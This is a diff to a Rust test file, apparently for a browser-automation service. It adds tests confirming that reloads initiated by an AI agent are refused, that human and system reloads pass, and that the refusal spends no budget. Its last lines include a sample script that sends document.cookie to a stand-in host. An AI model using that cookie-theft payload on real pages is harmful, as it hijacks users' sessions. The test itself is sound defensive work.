@@ -31,6 +31,81 @@ fn deny_raw_script_refuses_evaluate_only() {
     }
 }
 
+/// WS9.B / D2-012: a reload is refused for the agent and for it only.
+#[test]
+fn deny_agent_reload_refuses_an_agent_and_nobody_else() {
+    let reload = AgentAction::Reload { ignore_cache: true };
+    let error = deny_agent_reload(&reload, StepInitiator::Agent, "run_test")
+        .expect_err("an agent's reload is refused");
+    assert_eq!(error.code, ErrorCode::Forbidden);
+    assert!(!error.retryable);
+    let details = error.details.clone().expect("typed details");
+    assert_eq!(details["reason"], "agent_reload_denied");
+    assert_eq!(details["denied_action"], "reload");
+    // A person's reload, and the system's, go through.
+    deny_agent_reload(&reload, StepInitiator::Human, "run_test").expect("a person may reload");
+    deny_agent_reload(&reload, StepInitiator::System, "run_test").expect("the edge itself may reload");
+    // The agent's other navigation actions are not this rule's business.
+    for other in [
+        AgentAction::Back,
+        AgentAction::Forward,
+        AgentAction::Navigate { url: "https://example.com/".to_owned() },
+    ] {
+        deny_agent_reload(&other, StepInitiator::Agent, "run_test").expect("only reload is refused");
+    }
+}
+
+/// A service principal and a person's token labelled agent are both the agent, so both are
+/// refused at admission, and the refusal comes before the budget is looked at (nothing spent).
+#[tokio::test]
+async fn admission_refuses_an_agents_reload_before_the_budget_and_spends_nothing() {
+    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
+    let state = test_state_with_static_driver();
+    let claims = crate::test_support::claims_for_org("org");
+    let reload = AgentAction::Reload { ignore_cache: false };
+    let service = service_claims("org", "svc_planner");
+    for (who, initiator) in [
+        ("service principal", derive_initiator_ref(&service, None, &AdvisoryAgent::default())),
+        (
+            "person labelled agent",
+            derive_initiator_ref(&claims, Some(InitiatorHint::Agent), &AdvisoryAgent::default()),
+        ),
+    ] {
+        // An exhausted budget would answer 402/429 if the reload reached gate 9.
+        let mut exhausted = entry_with_budget(Some(exhausted_budget()));
+        exhausted.actor_id = if who == "service principal" {
+            service.actor_id().to_string()
+        } else {
+            claims.actor_id().to_string()
+        };
+        let handle = handle_for(exhausted);
+        let mut entry = handle.entry.lock().await;
+        let steps_before = entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps);
+        let error = admit_action(
+            &state,
+            &handle,
+            &mut entry,
+            AdmitInput {
+                initiator,
+                action: &reload,
+                enforce_takeover: true,
+                last_observation: None,
+            },
+        )
+        .await
+        .expect_err("an agent's reload is refused");
+        assert_eq!(error.code, ErrorCode::Forbidden, "{who}");
+        assert_eq!(error.details.as_ref().unwrap()["reason"], "agent_reload_denied", "{who}");
+        assert!(entry.used_sensitive_approval_grants.is_empty(), "{who}");
+        assert_eq!(entry.summary.step, 0, "{who}");
+        assert_eq!(
+            entry.budget.as_ref().map(|b| b.ledger.snapshot(std::time::Instant::now()).steps),
+            steps_before,
+            "{who}: a refusal spends nothing"
+        );
+    }
+}
+
 #[test]
 fn deny_raw_script_error_is_typed_and_never_echoes_the_script() {
     let secret_script = "fetch('https://evil.invalid/?c='+document.cookie)";
